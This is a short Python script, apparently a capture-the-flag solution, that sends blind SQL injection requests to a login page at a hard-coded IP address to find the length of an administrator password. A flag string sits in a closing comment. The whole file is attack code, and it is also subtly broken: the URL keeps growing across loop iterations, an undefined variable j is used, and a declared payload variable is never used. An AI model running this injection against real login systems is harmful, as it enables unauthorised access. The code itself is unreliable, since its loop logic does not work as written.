import requests
URL = "http://43.201.142.219:1230/login.php?id=admadminin&password='/**/or/**/length(pw)/**/like/**/"

paylod = ""

password = ""


for i in range (1,25):
        URL += str(i)
        URL += "#&button="
        res = requests.get(URL)
        print(res.text)
        if(res.text.find('Wrong')<0):
            password += chr(j)
            print(password)
            
            break
        
print(password)
#POX{F3DD52597041A747716D93582A3858CBFCB5E4A35A5640BA1BC2C9869025EFDA}
